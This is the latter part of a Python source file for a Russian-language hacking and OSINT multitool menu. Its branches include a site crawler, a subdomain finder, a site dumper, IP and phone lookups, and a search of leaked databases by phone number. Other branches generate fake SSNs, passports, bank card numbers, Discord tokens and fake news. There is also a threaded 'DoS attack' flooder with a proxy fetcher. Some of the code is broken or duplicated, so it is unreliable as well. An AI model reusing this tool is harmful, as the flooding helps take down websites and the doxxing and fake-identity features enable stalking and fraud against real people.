        elif choice == '5':
            start_url = Write.Input('Ссылка: ', Colors.red_to_yellow, interval=0.00000000000000000000000000001)

            max_depth = 2
            visited = set()


            def crawl(url, depth=0):
                if depth > max_depth:
                    return

                parsed = urlparse(url)
                domain = f"{parsed.scheme}://{parsed.netloc}"

                if url in visited:
                    return

                try:
                    response = requests.get(url)
                    html = response.text
                    soup = BeautifulSoup(html, 'html.parser')

                except:
                    return

                visited.add(url)

                Write.Print("  |" + url + '\n', Colors.red_to_yellow, interval=0.00000000000000000000000000001)

                for link in soup.find_all('a'):
                    href = link.get('href')
                    if not href:
                        continue

                    href = href.split("#")[0].rstrip("/")
                    if href.startswith('http'):
                        href_parsed = urlparse(href)
                        if href_parsed.netloc != parsed.netloc:
                            continue
                    else:
                        href = domain + href

                    crawl(href, depth + 1)


            crawl(start_url)

        elif choice == '8':
            domain = Write.Input("Enter domain: ", Colors.red_to_yellow, interval=0.00000000000000000000000000001)
            get_website_info(domain)

        elif choice == '10':
            ip_address = Write.Input("Enter IP address: ", Colors.red_to_yellow, interval=0.00000000000000000000000000001)
            result = ip_lookup(ip_address)
            Write.Print(result, Colors.red_to_yellow, interval=0.00000000000000000000000000001)

        elif choice == '11':
            url = input(Colorate.Horizontal(Colors.red_to_yellow, ("Enter URL --->")))

        elif choice == '12':
            wordlist_path = Write.Input("Enter path to wordlist: ", Colors.red_to_yellow, interval=0.00000000000000000000000000001)
            domain = Write.Input("Enter domain: ", Colors.red_to_yellow, interval=0.00000000000000000000000000001)

            with open(wordlist_path, 'r') as file:
                wordlist = file.read()
            subdomainfinger(wordlist, domain)

        elif choice == '14':
            url = input(Colorate.Horizontal(Colors.red_to_yellow, ("Enter URL --->")))
            dump_site(url)

        elif choice == '15':
            phone_number = Write.Input("Enter phone number: ", Colors.red_to_yellow, interval=0.00000000000000000000000000001)
            info = get_phone_number_info(phone_number)
            Write.Print(info, Colors.red_to_yellow, interval=0.00000000000000000000000000001)
        elif choice == '16':
            print("Сгенерированный пароль:", generate_password())
        elif choice == '19':
            country_code = input("Введите код страны: ")
            print("Сгенерированный номер телефона:", generate_number(country_code))
        elif choice == '22':
            print("Сгенерированная личность:", generate_identity())
        elif choice == '25':
            print("Сгенерированный ключ Mullvad:", generate_mullvad_key())
        elif choice == '28':
            print("Сгенерированный токен Discord:", generate_discord_token())
        elif choice == '32':
            print("Сгенерированный номер банковской карты:", generate_credit_card())
        elif choice == '35':
            print("Сгенерированный email:", generate_email())
        elif choice == '38':
            print("Сгенерированная дата рождения:", generate_birthdate())
        elif choice == '41':
            print("Сгенерированный UUID:", generate_uuid())
        elif choice == '17':
            print("Сгенерированный MAC-адрес:", generate_mac())
        elif choice == '20':
            print("Сгенерированный адрес:", generate_address())
        elif choice == '23':
            print("Сгенерированное имя пользователя:", generate_username())
        elif choice == '26':
            print("Сгенерированная цитата:", generate_quote())
        elif choice == '29':
            print("Сгенерированная компания:", generate_company())
        elif choice == '32':
            print("Сгенерированная должность:", generate_job())
        elif choice == '36':
            print("Сгенерированный номер лицензии:", generate_license_plate())
        elif choice == '39':
            print("Сгенерированный SSN:", generate_ssn())
        elif choice == '42':
            print("soon")
        elif choice == '18':
            print("Сгенерированные координаты:", generate_coordinates())
        elif choice == '21':
            print("Сгенерированные фальшивые новости:", generate_fake_news())
        elif choice == '24':
            print("Сгенерированная цветовая палитра:", generate_color_palette())
        elif choice == '27':
            print("Сгенерированный пользовательский пароль:", prompt_password_criteria())
        elif choice == '30':
            print("Сгенерированный Bitcoin-адрес:", generate_bitcoin_address())
        elif choice == '33':
            print("Сгенерированный Bitcoin-ключ:", generate_bitcoin_private_key())
        elif choice == '36':
            print("Сгенерированный профиль акции:", generate_stock_profile())
        elif choice == '39':
            print("Сгенерированное медицинское портфолио:", generate_medical_profile())
        elif choice == '43':
            print("Сгенерированные паспортные данные:", generate_passport_details())
        elif choice == '44':
            user_input = input("Введите текст: ")
            replaced_text = replace_chars(user_input, True)
            clear_console()
            print("Результат замены:\n")
            print(replaced_text)
        elif choice == '45':
            user_input = input("Введите текст: ")
            replaced_text = replace_chars(user_input, False)
            clear_console()
            print("Результат замены:\n")
            print(replaced_text)
        elif choice == "46":
            mode = input(f"""[{colorama.Fore.WHITE}${colorama.Fore.GREEN}]Выберите режим:
        1 - Normal
        2 - PRO
        {colorama.Fore.WHITE}:{colorama.Fore.GREEN}""")
            if mode == "1":
                url = pystyle.Write.Input("[$] URL: ", pystyle.Colors.green_to_white, interval=0.00000000000000000000000000001)
                num_requests = int(
                    pystyle.Write.Input("[$] Введите количество запросов: ", pystyle.Colors.green_to_white, interval=0.00000000000000000000000000001))
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
                ]
                threads = []
                for i in range(1, num_requests + 1):
                    t = threading.Thread(target=send_request, args=(url, user_agents, i))
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
            elif mode == "2":
                url = pystyle.Write.Input(f"[$] Введите ссылку: ", pystyle.Colors.green_to_white, interval=0.00000000000000000000000000001)
                power = pystyle.Write.Input(f"[$] Выберите режим (1 - Слабый/2 - Средний/3 - Мощный): ",
                                            pystyle.Colors.green_to_white, interval=0.00000000000000000000000000001)
                try:
                    dos_attack(url, power)
                except Exception as e:
                    pystyle.Write.Print(f"[$] Произошла ошибка! Проверьте ввод данных! {e}\n",
                                        pystyle.Colors.green_to_white, interval=0.00000000000000000000000000001)
            else:
                pystyle.Write.Print("[$] Неизвестный режим\n", pystyle.Colors.green_to_white, interval=0.00000000000000000000000000001)
        elif choice == "48":
            def get_proxy():
                proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

                try:
                    response = requests.get(proxy_api_url)
                    if response.status_code == 200:
                        proxy_list = response.text.strip().split("\r\n")
                        return proxy_list
                    else:
                        pystyle.Write.Print(f"\nПроизошла ошибка -> {response.status_code}", pystyle.Colors.green_to_white,
                                            interval=0.005)
                except Exception as e:
                    pystyle.Write.Print(f"\nПроизошла ошибка -> {str(e)}", pystyle.Colors.green_to_white, interval=0.005)

                return None


            proxies = get_proxy()
            if proxies:
                pystyle.Write.Print("\nПрокси:\n", pystyle.Colors.green_to_white, interval=0.005)
                for proxy in proxies:
                    pystyle.Write.Print("\n" + proxy, pystyle.Colors.green_to_white, interval=0.005)
                print()
            else:
                pystyle.Write.Print("Прокси недоступно.", pystyle.Colors.green_to_white, interval=0.005)
        elif choice == '47':
            def get_characters(strength):
                characters = string.ascii_letters + string.digits
                if strength == "medium":
                    characters += "!@#$%^&*()qwertyuiopasdfghjklzxcvbnm,./;[]йцукенгшщзхъфывапролдячсмить"
                elif strength == "high":
                    characters += string.punctuation
                return characters


            def generate_password(length, strength):
                characters = get_characters(strength)
                password = ''.join(random.choice(characters) for i in range(length))
                return password


            password_length = int(Write.Input('Введите длину пароля: ', Colors.green_to_white, interval=0.005))
            complexity = Write.Input('Выберите сложность (low, medium, high): ', Colors.green_to_white, interval=0.005)
            complex_password = generate_password(password_length, complexity)
            Write.Print(complex_password + "\n", Colors.green_to_white, interval=0.005)

        elif choice == "49":
            phone = pystyle.Write.Input("\n[?] Введите номер телефона -> ", pystyle.Colors.white_to_red, interval=0.005)
            phoneinfo(phone)

        elif choice == "50":
            domain = pystyle.Write.Input("\n[?] Введите сайт -> ", pystyle.Colors.white_to_red, interval=0.005)
            get_website_info(domain)
        elif choice == "51":
            nick = pystyle.Write.Input(f"\n[?] Введите никнейм -> ", pystyle.Colors.white_to_red, interval=0.005)
            check_nickname(nick)

        elif choice == "53":
            url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.white_to_red, interval=0.005)
            num_requests = int(
                pystyle.Write.Input(
                    "[?] Введите количество запросов: ", pystyle.Colors.white_to_red, interval=0.005
                )
            )
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
            ]


            def send_request(i):
                user_agent = random.choice(user_agents)
                headers = {"User-Agent": user_agent}
                try:
                    print(f"{colorama.Fore.white_to_red}[+] Request {i} sent successfully\n")
                except:
                    print(f"{colorama.Fore.white_to_red}[+] Request {i} sent successfully\n")


            threads = []
            for i in range(1, num_requests + 1):
                t = threading.Thread(target=send_request, args=[i])
                t.start()
                threads.append(t)
            for t in threads:
                t.join()


        elif choice == "54":
            def mac_lookup(mac_address):
                api_url = f"https://api.macvendors.com/{mac_address}"
                try:
                    response = requests.get(api_url)
                    if response.status_code == 200:
                        return response.text.strip()
                    else:
                        return f"Error: {response.status_code} - {response.text}"
                except Exception as e:
                    return f"Error: {str(e)}"


            mac_address = pystyle.Write.Input("[?] Введите Mac-Address -> ", pystyle.Colors.white_to_red,
                                              interval=0.005)  # Replace this with the MAC address you want to lookup
            vendor = mac_lookup(mac_address)
            pystyle.Write.Print(f"Vendor: {vendor}", pystyle.Colors.white_to_red, interval=0.005)
        elif choice == "57":
            ip = pystyle.Write.Input("\n[?] Введите ip -> ", pystyle.Colors.white_to_red, interval=0.005)
            get_info_by_ip(ip)
        elif choice == "58":
            path = pystyle.Write.Input("\n[?] Введите путь к БД: ", pystyle.Colors.white_to_red, interval=0.005)
            search_text = pystyle.Write.Input("\n[?] Введите текст:  ", pystyle.Colors.white_to_red, interval=0.005)
            print()
            search_in_db(path, search_text)
        elif choice == "59":
            def get_proxy():
                proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

                try:
                    response = requests.get(proxy_api_url)
                    if response.status_code == 200:
                        proxy_list = response.text.strip().split("\r\n")
                        return proxy_list
                    else:
                        pystyle.Write.Print(f"\nПроизошла ошибка -> {response.status_code}", pystyle.Colors.white_to_red,
                                            interval=0.005)
                except Exception as e:
                    pystyle.Write.Print(f"\nПроизошла ошибка -> {str(e)}", pystyle.Colors.white_to_red, interval=0.005)

                return None


            proxies = get_proxy()
            if proxies:
                pystyle.Write.Print("\nПрокси:\n", pystyle.Colors.white_to_red, interval=0.005)
                for proxy in proxies:
                    pystyle.Write.Print("\n" + proxy, pystyle.Colors.white_to_red, interval=0.005)
                print()
            else:
                pystyle.Write.Print("Прокси недоступно.", pystyle.Colors.white_to_red, interval=0.005)

        elif choice == '60':
            def get_token_info(token):
                url = f"https://api.telegram.org/bot{token}/getMe"
                response = requests.get(url)
                if response.status_code == 200:
                    token_info = response.json()
                    return token_info
                else:
                    print(Fore.RED + "Error: Unable to fetch token info")
                    return None


            def display_token_info(token_info):
                if token_info:
                    print(Fore.GREEN + f"""
                    Token: {token_info['result']['id']} 
                    id: {token_info['result']['id']} 
                    is_bot: {token_info['result']['is_bot']}
                    first_name: {token_info['result']['first_name']}
                    username: {token_info['result']['username']}
                    can_join_groups: {token_info['result']['can_join_groups']}
                    supports_inline_queries: {token_info['result']['supports_inline_queries']}
                    """)
                else:
                    print(Fore.RED + "No token info available.")


            def press_enter_to_continue():
                input(Fore.YELLOW + "Press Enter...")
                subprocess.run(["python", "main.py"])


            def token_bot():
                token = input(Fore.BLUE + "Enter your bot token: ")
                token_info = get_token_info(token)
                display_token_info(token_info)
                press_enter_to_continue()

        elif choice == '61':
            def search_phone_number_in_folder(folder_path):
                if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
                    print(
                        f'{COLOR_CODE["RED"]}Ошибка: "{folder_path}" не является папкой или не существует.{COLOR_CODE["RESET"]}')
                    return
                search_value = input(
                    f'{COLOR_CODE["RED"]}Введите номер телефона для поиска (в формате 79999999999): {COLOR_CODE["RESET"]}')
                for root, dirs, files in os.walk(folder_path):
                    for filename in files:
                        file_path = os.path.join(root, filename)
                        if os.path.isfile(file_path):
                            with open(file_path, 'r', encoding='utf-8') as file:
                                lines = file.readlines()
                            for line in lines:
                                if search_value in line:
                                    print(
                                        f'{COLOR_CODE["RED"]}Найден номер {search_value} в файле: {file_path}{COLOR_CODE["RESET"]}')
                                    print(f'{COLOR_CODE["RED"]}Информация о пользователе:{COLOR_CODE["RESET"]}')
                                    print(line)
                                    print('\n')
                input(f'{COLOR_CODE["RED"]}Нажмите Enter......{COLOR_CODE["RESET"]}')


            folder_path = 'Database'
            search_phone_number_in_folder(folder_path)

        elif choice == 'q':
            print("Exiting...")
            time.sleep(0.5)
            break


if __name__ == "__main__":
    clear_console()

    check_and_install_modules()

    run_main_program()